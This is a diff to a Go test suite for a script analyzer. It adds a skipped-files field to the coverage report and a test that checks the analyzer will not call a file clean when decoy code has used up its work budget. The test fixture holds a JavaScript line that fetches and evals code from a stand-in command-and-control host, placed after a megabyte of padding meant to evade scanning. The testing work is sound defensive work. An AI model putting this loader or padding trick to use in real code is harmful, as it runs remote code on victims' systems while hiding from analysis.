@@ -25,6 +25,10 @@ type scriptReport struct {
 	Coverage struct {
 		FilesSeen     int `json:"files_seen"`
 		FilesAnalyzed int `json:"files_analyzed"`
+		Skipped       []struct {
+			Path   string `json:"path"`
+			Reason string `json:"reason"`
+		} `json:"skipped"`
 	} `json:"coverage"`
 }
 
@@ -313,6 +317,42 @@ module.exports = { loadSharedConfigFiles, httpRequest };
 			}
 			if rep.Coverage.FilesAnalyzed != rep.Coverage.FilesSeen {
 				t.Errorf("analyzed %d of %d files", rep.Coverage.FilesAnalyzed, rep.Coverage.FilesSeen)
+			}
+		})
+	}
+}
+
+// P2, P3: a script cannot hide a payload by filling the analyzer's work budget.
+func TestScriptBudgetIsNotClean(t *testing.T) {
+	tests := []struct {
+		name string
+		// inputs
+		setup func(t *testing.T) string
+		// expectations
+		wantCode int
+		wantSkip string
+	}{
+		{
+			name: "1 MB of decoy eval calls before a download that is run",
+			setup: filesRepo(map[string]string{"loader.js": strings.Repeat("eval(", 1<<20/5) + "\n" +
+				"eval(await (await fetch('https://c2.sinkhole.test/p.js')).text());\n"}),
+			wantCode: 10,
+			wantSkip: "budget",
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			// Given a script whose decoys use up the work budget
+			target := tt.setup(t)
+			// When the agent analyzes it
+			rep := analyzeScript(t, target, tt.wantCode)
+			// Then the file is reported as not fully checked, and the verdict is not clean
+			var got string
+			for _, s := range rep.Coverage.Skipped {
+				got = s.Reason
+			}
+			if got != tt.wantSkip {
+				t.Errorf("skipped = %+v, want reason %q", rep.Coverage.Skipped, tt.wantSkip)
 			}
 		})
 	}
